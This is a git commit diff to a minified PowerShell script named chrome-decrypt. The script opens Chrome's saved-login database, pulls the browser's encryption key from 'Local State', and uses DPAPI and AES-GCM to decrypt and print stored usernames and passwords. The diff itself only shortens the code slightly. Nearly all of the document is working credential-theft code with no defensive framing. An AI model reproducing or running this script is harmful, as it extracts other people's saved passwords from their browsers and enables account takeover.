7bf414ac3f0486584168579af11cacbfe19dc118
Robert <rwallhead@gmail.com>
2022-05-28 13:15:53 +1000

    1293

--- chrome-decrypt.minified.ps1
+++ chrome-decrypt.minified.ps1
@@ -7,7 +7,6 @@ $q='(s,i)'
 $f='(p s,int i)'
 $z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
 $u=[Security.Cryptography.ProtectedData]
-$n=$x=$null
 Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
 $s=[W]::O("$z\\Default\\Login Data",[ref]$d)
 if($host.Version.Major -eq 7){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
@@ -15,7 +14,7 @@ $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([System.Convert]::FromBase6
 for(;!([W]::S($s)%100)){[W]::T($s,0)
 [W]::T($s,3)
 $c=[W]::B($s,5)
-try{(($u::Unprotect($c,$n,0)|%{[char]$_})-join'')
+try{(($u::Unprotect($c,$null,0)|%{[char]$_})-join'')
 continue}catch{}if($x){$k=$c.length
 $t=$c[15..($k-17)]
 $e=[byte[]]::new($t.length)
